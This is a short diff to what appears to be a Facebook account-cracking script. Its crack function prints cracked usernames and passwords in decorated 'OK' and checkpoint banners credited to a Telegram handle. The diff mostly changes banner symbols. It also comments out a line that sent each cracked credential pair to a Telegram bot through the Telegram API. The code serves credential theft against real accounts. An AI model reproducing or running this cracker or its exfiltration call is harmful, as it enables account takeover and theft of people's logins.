@@ -1311,8 +1311,8 @@ def crack(idf,pwv):
 					print('\n')
 					statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️
 ⋘─────━𓆩مدفوع𓆪‏━─────⋙
-♨️ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
-♨️ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
 سكيور حض اوفر حبيبي 
 ⋘─────━𓆩مدفوع𓆪‏━─────⋙
 BY = @mx1mq |'''
@@ -1333,7 +1333,9 @@ BY = @mx1mq |'''
 					print('\n')
 					statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 BY = @mx1mq'''
 					statusok1 = nel(statusok, style='green')
@@ -1411,7 +1413,7 @@ BY = @mx1mq '''
 					'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					#requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
 					cek_RMAD(kuki)
 					break
 
